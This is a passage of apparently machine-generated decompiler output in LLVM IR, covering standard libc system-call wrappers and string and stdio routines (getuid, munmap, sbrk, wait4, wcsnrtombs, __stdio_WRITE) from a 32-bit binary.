  %v0_8055971 = phi i32 [ %v1_8055959, %entry ], [ -1, %dec_label_pc_8055964 ]
  %v2_8055974 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055974, i32* @ebx, align 4
  ret i32 %v0_8055971

; uselistorder directives
  uselistorder i32 %v1_8055959, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_8055970, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055978 = load i32, i32* @ebx, align 4
  store i32 %v0_8055978, i32* %stack_var_-4, align 4
  %v1_8055981 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8055981, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055981, -4095
  br i1 %tmp, label %dec_label_pc_8055998, label %dec_label_pc_805598c

dec_label_pc_805598c:                             ; preds = %entry
  %v0_805598c = load i32, i32* %stack_var_-4, align 4
  %v1_805598c = call i32 @__errno_location(i32 %v0_805598c)
  %v0_8055991 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055991 = sub i32 0, %v0_8055991
  %v2_8055993 = inttoptr i32 %v1_805598c to i32*
  store i32 %v1_8055991, i32* %v2_8055993, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055998

dec_label_pc_8055998:                             ; preds = %entry, %dec_label_pc_805598c
  %v0_8055999 = phi i32 [ %v1_8055981, %entry ], [ -1, %dec_label_pc_805598c ]
  %v2_805599c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805599c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055999

; uselistorder directives
  uselistorder i32 %v1_8055981, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055998, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_80559a0 = load i32, i32* @global_var_8065730.1000, align 16
  store i32 %v0_80559a0, i32* @edx, align 4
  %v1_80559ab = icmp eq i32 %v0_80559a0, 0
  %v1_80559ad = icmp eq i1 %v1_80559ab, false
  %v4_80559ad = select i1 %v1_80559ad, i32 %v0_80559a0, i32 4096
  ret i32 %v4_80559ad
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80559b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80559b4, i32* %stack_var_-4, align 4
  %v1_80559bd = call i32 @int80_syscall(i32 199)
  store i32 %v1_80559bd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80559bd, -4095
  br i1 %tmp, label %dec_label_pc_80559d4, label %dec_label_pc_80559c8

dec_label_pc_80559c8:                             ; preds = %entry
  %v0_80559c8 = load i32, i32* %stack_var_-4, align 4
  %v1_80559c8 = call i32 @__errno_location(i32 %v0_80559c8)
  %v0_80559cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80559cd = sub i32 0, %v0_80559cd
  %v2_80559cf = inttoptr i32 %v1_80559c8 to i32*
  store i32 %v1_80559cd, i32* %v2_80559cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80559d4

dec_label_pc_80559d4:                             ; preds = %entry, %dec_label_pc_80559c8
  %v0_80559d5 = phi i32 [ %v1_80559bd, %entry ], [ -1, %dec_label_pc_80559c8 ]
  %v2_80559d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80559d8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80559d5

; uselistorder directives
  uselistorder i32 %v1_80559bd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_80559d4, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80559dc = load i32, i32* @ebx, align 4
  store i32 %v0_80559dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80559ef = call i32 @munmap(i32 %v0_80559dc, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80559ef, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80559ef, -4095
  br i1 %tmp, label %dec_label_pc_8055a08, label %dec_label_pc_80559fc

dec_label_pc_80559fc:                             ; preds = %entry
  %v0_80559fc = load i32, i32* %stack_var_-4, align 4
  %v1_80559fc = call i32 @__errno_location(i32 %v0_80559fc)
  %v0_8055a01 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055a01 = sub i32 0, %v0_8055a01
  %v2_8055a03 = inttoptr i32 %v1_80559fc to i32*
  store i32 %v1_8055a01, i32* %v2_8055a03, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055a08

dec_label_pc_8055a08:                             ; preds = %entry, %dec_label_pc_80559fc
  %v0_8055a09 = phi i32 [ %v4_80559ef, %entry ], [ -1, %dec_label_pc_80559fc ]
  %v2_8055a08 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055a08, i32* @edx, align 4
  %v2_8055a0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055a0c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055a09

; uselistorder directives
  uselistorder i32 %v4_80559ef, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055a08, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055a10 = load i32, i32* @ebx, align 4
  store i32 %v0_8055a10, i32* %stack_var_-4, align 4
  %v4_8055a14 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8055a14, i32* %ebx.global-to-local, align 4
  %v6_8055a23 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8055a23, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_8055a23, -4095
  br i1 %tmp, label %dec_label_pc_8055a3c, label %dec_label_pc_8055a30

dec_label_pc_8055a30:                             ; preds = %entry
  %v0_8055a30 = load i32, i32* %stack_var_-4, align 4
  %v1_8055a30 = call i32 @__errno_location(i32 %v0_8055a30)
  %v0_8055a35 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055a35 = sub i32 0, %v0_8055a35
  %v2_8055a37 = inttoptr i32 %v1_8055a30 to i32*
  store i32 %v1_8055a35, i32* %v2_8055a37, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055a3c

dec_label_pc_8055a3c:                             ; preds = %entry, %dec_label_pc_8055a30
  %v0_8055a3d = phi i32 [ %v6_8055a23, %entry ], [ -1, %dec_label_pc_8055a30 ]
  %v2_8055a3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055a3c, i32* @edx, align 4
  %v2_8055a40 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055a40, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055a3d

; uselistorder directives
  uselistorder i32 %v6_8055a23, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055a3c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8055a45 = load i32, i32* @ebx, align 4
  %v0_8055a49 = load i32, i32* @global_var_8065764.1005, align 4
  %v1_8055a49 = icmp eq i32 %v0_8055a49, 0
  %v1_8055a54 = icmp eq i1 %v1_8055a49, false
  br i1 %v1_8055a54, label %dec_label_pc_8055a67, label %dec_label_pc_8055a56

dec_label_pc_8055a56:                             ; preds = %entry
  %v1_8055a5b = call i32 @__GI_brk(i32 0)
  %v2_8055a63 = icmp slt i32 %v1_8055a5b, 0
  br i1 %v2_8055a63, label %dec_label_pc_8055a89, label %dec_label_pc_8055a56.dec_label_pc_8055a67_crit_edge

dec_label_pc_8055a56.dec_label_pc_8055a67_crit_edge: ; preds = %dec_label_pc_8055a56
  %v0_8055a69.pre = load i32, i32* @global_var_8065764.1005, align 4
  br label %dec_label_pc_8055a67

dec_label_pc_8055a67:                             ; preds = %dec_label_pc_8055a56.dec_label_pc_8055a67_crit_edge, %entry
  %v0_8055a77 = phi i32 [ %v0_8055a69.pre, %dec_label_pc_8055a56.dec_label_pc_8055a67_crit_edge ], [ %v0_8055a49, %entry ]
  %v1_8055a67 = icmp eq i32 %arg1, 0
  %v1_8055a6e = icmp eq i1 %v1_8055a67, false
  br i1 %v1_8055a6e, label %dec_label_pc_8055a74, label %dec_label_pc_8055a70

dec_label_pc_8055a70:                             ; preds = %dec_label_pc_8055a67
  br label %dec_label_pc_8055a8c

dec_label_pc_8055a74:                             ; preds = %dec_label_pc_8055a67
  store i32 %v0_8055a77, i32* @ebx, align 4
  %v2_8055a79 = add i32 %v0_8055a77, %arg1
  %v1_8055a7d = call i32 @__GI_brk(i32 %v2_8055a79)
  %v2_8055a85 = icmp slt i32 %v1_8055a7d, 0
  %v1_8055a87 = icmp eq i1 %v2_8055a85, false
  br i1 %v1_8055a87, label %dec_label_pc_8055a74.dec_label_pc_8055a8c_crit_edge, label %dec_label_pc_8055a89

dec_label_pc_8055a74.dec_label_pc_8055a8c_crit_edge: ; preds = %dec_label_pc_8055a74
  %v0_8055a8d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055a8c

dec_label_pc_8055a89:                             ; preds = %dec_label_pc_8055a74, %dec_label_pc_8055a56
  br label %dec_label_pc_8055a8c

dec_label_pc_8055a8c:                             ; preds = %dec_label_pc_8055a74.dec_label_pc_8055a8c_crit_edge, %dec_label_pc_8055a70, %dec_label_pc_8055a89
  %v0_8055a8d = phi i32 [ %v0_8055a8d.pre, %dec_label_pc_8055a74.dec_label_pc_8055a8c_crit_edge ], [ %v0_8055a77, %dec_label_pc_8055a70 ], [ -1, %dec_label_pc_8055a89 ]
  %v2_8055a8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055a8c, i32* @edx, align 4
  store i32 %v0_8055a45, i32* @ebx, align 4
  ret i32 %v0_8055a8d

; uselistorder directives
  uselistorder i32 %v0_8055a77, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8055a8c, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8055a94 = load i32, i32* @edi, align 4
  %v0_8055a95 = load i32, i32* @esi, align 4
  store i32 %v0_8055a95, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8055aa9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8055ab1 = call i32 @wait4(i32 %v0_8055aa9, i32 %v0_8055a95, i32 %v0_8055a94, i32 %tmp5)
  store i32 %v0_8055aa9, i32* @ebx, align 4
  store i32 %v4_8055ab1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8055ab1, -4095
  br i1 %tmp, label %dec_label_pc_8055ac9, label %dec_label_pc_8055abd

dec_label_pc_8055abd:                             ; preds = %entry
  %v1_8055abd = call i32 @__errno_location(i32 %v0_8055aa9)
  %v0_8055ac2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055ac2 = sub i32 0, %v0_8055ac2
  %v2_8055ac4 = inttoptr i32 %v1_8055abd to i32*
  store i32 %v1_8055ac2, i32* %v2_8055ac4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055ac9

dec_label_pc_8055ac9:                             ; preds = %entry, %dec_label_pc_8055abd
  %v0_8055aca = phi i32 [ %v4_8055ab1, %entry ], [ -1, %dec_label_pc_8055abd ]
  %v2_8055acc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055acc, i32* @esi, align 4
  store i32 %v0_8055a94, i32* @edi, align 4
  ret i32 %v0_8055aca

; uselistorder directives
  uselistorder i32 %v4_8055ab1, { 1, 0, 2 }
  uselistorder i32 %v0_8055aa9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055ac9, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8065744.1006 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8055ae3 = icmp eq i32 %tmp4, 0
  %v1_8055ae5 = icmp eq i1 %v1_8055ae3, false
  br i1 %v1_8055ae5, label %dec_label_pc_8055aed, label %dec_label_pc_8055ae7

dec_label_pc_8055ae7:                             ; preds = %entry
  %v2_8055ae7 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8055aed

dec_label_pc_8055aed:                             ; preds = %entry, %dec_label_pc_8055ae7
  %v0_8055b09 = phi i32 [ %tmp4, %entry ], [ %v2_8055ae7, %dec_label_pc_8055ae7 ]
  %v0_8055af5 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_8055ae7 ]
  %v2_8055aed = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8055aed, i32* %stack_var_-8, align 4
  store i32 %v0_8055af5, i32* %stack_var_-4, align 4
  %v2_8055b04 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8055b0a = inttoptr i32 %v0_8055b09 to i8*
  %v6_8055b0a = call i32 @__GI_wcsnrtombs(i8* %v5_8055b0a, i32 %v2_8055b04, i32 1, i32 16, i32 %tmp)
  %v1_8055b14 = icmp eq i32 %v6_8055b0a, 0
  %v3_8055b16 = select i1 %v1_8055b14, i32 1, i32 %v6_8055b0a
  ret i32 %v3_8055b16

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8055aed, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8055b35 = inttoptr i32 %tmp to i8*
  %v6_8055b35 = call i32 @__GI_wcsnrtombs(i8* %v5_8055b35, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8055b35
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_8055b43 = load i32, i32* @ebx, align 4
  %v4_8055b47 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055b47, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8055b57 = icmp eq i8* %arg1, null
  store i1 %v1_8055b57, i1* %zf.global-to-local, align 1
  br i1 %v1_8055b57, label %dec_label_pc_8055b66, label %dec_label_pc_8055b5b

dec_label_pc_8055b5b:                             ; preds = %entry
  %v12_8055b5b = icmp eq i32 %v4_8055b47, %arg2
  store i1 %v12_8055b5b, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8055b62 = icmp eq i1 %v12_8055b5b, false
  br i1 %v1_8055b62, label %dec_label_pc_8055b89, label %dec_label_pc_8055b83

dec_label_pc_8055b66:                             ; preds = %entry
  %v2_8055b66 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055b66, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8055b87

dec_label_pc_8055b6f:                             ; preds = %dec_label_pc_8055b97
  %v1_8055b6f = call i32 @__errno_location(i32 %v0_8055b43)
  %v1_8055b74 = inttoptr i32 %v1_8055b6f to i32*
  store i32 84, i32* %v1_8055b74, align 4
  br label %dec_label_pc_8055bbd

dec_label_pc_8055b7f:                             ; preds = %dec_label_pc_8055b9e
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8055bb2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055bae

dec_label_pc_8055b83:                             ; preds = %dec_label_pc_8055b5b
  %v2_8055b83 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055b83, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055b87

dec_label_pc_8055b87:                             ; preds = %dec_label_pc_8055b66, %dec_label_pc_8055b83
  %v2_8055ba016 = phi i32 [ %v2_8055b66, %dec_label_pc_8055b66 ], [ %v2_8055b83, %dec_label_pc_8055b83 ]
  %v1_8055b8c12 = phi i32 [ -1, %dec_label_pc_8055b66 ], [ %arg4, %dec_label_pc_8055b83 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055b89

dec_label_pc_8055b89:                             ; preds = %dec_label_pc_8055b5b, %dec_label_pc_8055b87
  %v2_8055ba015 = phi i32 [ %v4_8055b47, %dec_label_pc_8055b5b ], [ %v2_8055ba016, %dec_label_pc_8055b87 ]
  %v0_8055b8e = phi i32 [ %arg4, %dec_label_pc_8055b5b ], [ %v1_8055b8c12, %dec_label_pc_8055b87 ]
  %v1_8055b89 = inttoptr i32 %arg2 to i32*
  %v2_8055b89 = load i32, i32* %v1_8055b89, align 4
  store i32 %v2_8055b89, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_8055b8e, %arg3
  %v5_8055b90 = select i1 %tmp31, i32 %arg3, i32 %v0_8055b8e
  store i32 %v5_8055b90, i32* %edi.global-to-local, align 4
  store i32 %v5_8055b90, i32* @ecx, align 4
  %v1_8055baa3 = icmp eq i32 %v5_8055b90, 0
  store i1 %v1_8055baa3, i1* %zf.global-to-local, align 1
  %v1_8055bac10 = icmp eq i1 %v1_8055baa3, false
  br i1 %v1_8055bac10, label %dec_label_pc_8055b97, label %dec_label_pc_8055bae

dec_label_pc_8055b97:                             ; preds = %dec_label_pc_8055b89, %dec_label_pc_8055ba4
  %v2_8055ba0 = phi i32 [ %v2_8055ba7, %dec_label_pc_8055ba4 ], [ %v2_8055ba015, %dec_label_pc_8055b89 ]
  %v0_8055b97 = phi i32 [ %v1_8055ba4, %dec_label_pc_8055ba4 ], [ %v2_8055b89, %dec_label_pc_8055b89 ]
  %v1_8055b97 = inttoptr i32 %v0_8055b97 to i32*
  %v2_8055b97 = load i32, i32* %v1_8055b97, align 4
  %v9_8055b99 = icmp eq i32 %v2_8055b97, 127
  store i1 %v9_8055b99, i1* %zf.global-to-local, align 1
  %v6_8055b9c = icmp ugt i32 %v2_8055b97, 127
  br i1 %v6_8055b9c, label %dec_label_pc_8055b6f, label %dec_label_pc_8055b9e

dec_label_pc_8055b9e:                             ; preds = %dec_label_pc_8055b97
  %v3_8055b9e = trunc i32 %v2_8055b97 to i8
  %v4_8055b9e = icmp eq i8 %v3_8055b9e, 0
  store i1 %v4_8055b9e, i1* %zf.global-to-local, align 1
  %v3_8055ba0 = inttoptr i32 %v2_8055ba0 to i8*
  store i8 %v3_8055b9e, i8* %v3_8055ba0, align 1
  %v0_8055ba2 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055ba2, label %dec_label_pc_8055b7f, label %dec_label_pc_8055ba4

dec_label_pc_8055ba4:                             ; preds = %dec_label_pc_8055b9e
  %v0_8055ba4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055ba4 = add i32 %v0_8055ba4, 4
  store i32 %v1_8055ba4, i32* %ebx.global-to-local, align 4
  %v0_8055ba7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055ba7 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055ba7 = add i32 %v1_8055ba7, %v0_8055ba7
  store i32 %v2_8055ba7, i32* %edx.global-to-local, align 4
  %v0_8055ba9 = load i32, i32* @ecx, align 4
  %v1_8055ba9 = add i32 %v0_8055ba9, -1
  %v8_8055ba9 = icmp eq i32 %v1_8055ba9, 0
  store i32 %v1_8055ba9, i32* @ecx, align 4
  store i1 %v8_8055ba9, i1* %zf.global-to-local, align 1
  %v1_8055bac = icmp eq i1 %v8_8055ba9, false
  br i1 %v1_8055bac, label %dec_label_pc_8055b97, label %dec_label_pc_8055bae

dec_label_pc_8055bae:                             ; preds = %dec_label_pc_8055ba4, %dec_label_pc_8055b89, %dec_label_pc_8055b7f
  %v0_8055bb6 = phi i32 [ 0, %dec_label_pc_8055b7f ], [ %v2_8055b89, %dec_label_pc_8055b89 ], [ %v1_8055ba4, %dec_label_pc_8055ba4 ]
  %v0_8055bb2 = phi i32 [ %v0_8055bb2.pre, %dec_label_pc_8055b7f ], [ %v2_8055ba015, %dec_label_pc_8055b89 ], [ %v2_8055ba7, %dec_label_pc_8055ba4 ]
  %v2_8055bae = ptrtoint i32* %stack_var_-32 to i32
  %v12_8055bb2 = icmp eq i32 %v0_8055bb2, %v2_8055bae
  store i1 %v12_8055bb2, i1* %zf.global-to-local, align 1
  br i1 %v12_8055bb2, label %dec_label_pc_8055bb9, label %dec_label_pc_8055bb6

dec_label_pc_8055bb6:                             ; preds = %dec_label_pc_8055bae
  %v1_8055bb6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055bb6 = inttoptr i32 %v1_8055bb6 to i32*
  store i32 %v0_8055bb6, i32* %v2_8055bb6, align 4
  br label %dec_label_pc_8055bb9

dec_label_pc_8055bb9:                             ; preds = %dec_label_pc_8055bae, %dec_label_pc_8055bb6
  %v0_8055bb9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055bbb = load i32, i32* @ecx, align 4
  %v2_8055bbb = sub i32 %v0_8055bb9, %v1_8055bbb
  %v12_8055bbb = icmp eq i32 %v2_8055bbb, 0
  br label %dec_label_pc_8055bbd

dec_label_pc_8055bbd:                             ; preds = %dec_label_pc_8055b6f, %dec_label_pc_8055bb9
  %storemerge = phi i1 [ %v12_8055bbb, %dec_label_pc_8055bb9 ], [ false, %dec_label_pc_8055b6f ]
  %storemerge1 = phi i32 [ %v2_8055bbb, %dec_label_pc_8055bb9 ], [ -1, %dec_label_pc_8055b6f ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_8055bbd = load i32, i32* @esp, align 4
  %v9_8055bbd = icmp eq i32 %v0_8055bbd, -28
  store i1 %v9_8055bbd, i1* %zf.global-to-local, align 1
  store i32 %v0_8055b43, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_8055bb2, { 1, 0 }
  uselistorder i32 %v2_8055ba7, { 0, 2, 1 }
  uselistorder i32 %v1_8055ba4, { 0, 2, 1 }
  uselistorder i32 %v2_8055b97, { 1, 2, 0 }
  uselistorder i32 %v2_8055b89, { 1, 0, 2 }
  uselistorder i32 %v0_8055b8e, { 1, 0 }
  uselistorder i32 %v2_8055ba015, { 1, 0 }
  uselistorder i1 %v12_8055b5b, { 1, 0 }
  uselistorder i32 %v4_8055b47, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 12, 2, 7, 4, 5, 6, 0, 8, 3, 9, 10, 11 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 3, 0, 2, 8, 4, 5, 9, 6, 1, 7 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055bbd, { 1, 0 }
  uselistorder label %dec_label_pc_8055bb9, { 1, 0 }
  uselistorder label %dec_label_pc_8055b97, { 1, 0 }
  uselistorder label %dec_label_pc_8055b89, { 1, 0 }
  uselistorder label %dec_label_pc_8055b87, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_8055bcb = ptrtoint i32* %stack_var_12 to i32
  %v0_8055bd3 = load i32, i32* @edx, align 4
  %v4_8055bdd = inttoptr i32 %arg1 to i16*
  %v5_8055bdd = call i32 @__GI_vfprintf(i16* %v4_8055bdd, i32 %arg2, i32 %v2_8055bcb, i32 %v0_8055bd3)
  ret i32 %v5_8055bdd
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_8055be9 = load i32, i32* @edi, align 4
  %v0_8055beb = load i32, i32* @ebx, align 4
  %v15_8055bec = ptrtoint i32* %stack_var_-28 to i32
  %v4_8055bef = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055bef, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8055bfb5 = icmp eq i32 %arg3, 0
  store i1 %v1_8055bfb5, i1* %zf.global-to-local, align 1
  br i1 %v1_8055bfb5, label %dec_label_pc_8055c5c, label %dec_label_pc_8055c00.lr.ph

dec_label_pc_8055c00.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8055c00

dec_label_pc_8055c00:                             ; preds = %dec_label_pc_8055c1c.dec_label_pc_8055c00_crit_edge, %dec_label_pc_8055c00.lr.ph
  %v0_8055c0d = phi i32 [ %v4_8055bef, %dec_label_pc_8055c00.lr.ph ], [ %v0_8055c0d.pre, %dec_label_pc_8055c1c.dec_label_pc_8055c00_crit_edge ]
  %v0_8055c0c = phi i32 [ %arg2, %dec_label_pc_8055c00.lr.ph ], [ %v2_8055c1e, %dec_label_pc_8055c1c.dec_label_pc_8055c00_crit_edge ]
  %v0_8055c08.in = phi i32 [ %arg3, %dec_label_pc_8055c00.lr.ph ], [ %v2_8055c1c, %dec_label_pc_8055c1c.dec_label_pc_8055c00_crit_edge ]
  %v4_8055c08 = phi i32 [ %arg3, %dec_label_pc_8055c00.lr.ph ], [ %v2_8055c1c, %dec_label_pc_8055c1c.dec_label_pc_8055c00_crit_edge ]
  %v0_8055c08 = icmp slt i32 %v0_8055c08.in, 0
  store i32 %v4_8055c08, i32* %esi.global-to-local, align 4
  %v2_8055c08 = icmp eq i1 %v0_8055c08, false
  %v5_8055c08 = select i1 %v2_8055c08, i32 %v4_8055c08, i32 2147483647
  store i32 %v5_8055c08, i32* %eax.global-to-local, align 4
  %v1_8055c0d = add i32 %v0_8055c0d, 4
  %v2_8055c0d = inttoptr i32 %v1_8055c0d to i32*
  %v3_8055c0d = load i32, i32* %v2_8055c0d, align 4
  %tmp37 = inttoptr i32 %v0_8055c0c to i32*
  %v5_8055c10 = call i32 @__libc_write(i32 %v3_8055c0d, i32* %tmp37, i32 %v5_8055c08)
  store i32 %v5_8055c10, i32* %eax.global-to-local, align 4
  %v1_8055c18 = icmp eq i32 %v5_8055c10, 0
  store i1 %v1_8055c18, i1* %zf.global-to-local, align 1
  %v2_8055c18 = icmp slt i32 %v5_8055c10, 0
  br i1 %v2_8055c18, label %dec_label_pc_8055c22, label %dec_label_pc_8055c1c

dec_label_pc_8055c1c:                             ; preds = %dec_label_pc_8055c00
  %v0_8055c1c = load i32, i32* @ebx, align 4
  %v2_8055c1c = sub i32 %v0_8055c1c, %v5_8055c10
  %v12_8055c1c = icmp eq i32 %v2_8055c1c, 0
  store i32 %v2_8055c1c, i32* @ebx, align 4
  %v0_8055c1e = load i32, i32* @edi, align 4
  %v2_8055c1e = add i32 %v0_8055c1e, %v5_8055c10
  store i32 %v2_8055c1e, i32* @edi, align 4
  store i1 %v12_8055c1c, i1* %zf.global-to-local, align 1
  br i1 %v12_8055c1c, label %dec_label_pc_8055c5c, label %dec_label_pc_8055c1c.dec_label_pc_8055c00_crit_edge

dec_label_pc_8055c1c.dec_label_pc_8055c00_crit_edge: ; preds = %dec_label_pc_8055c1c
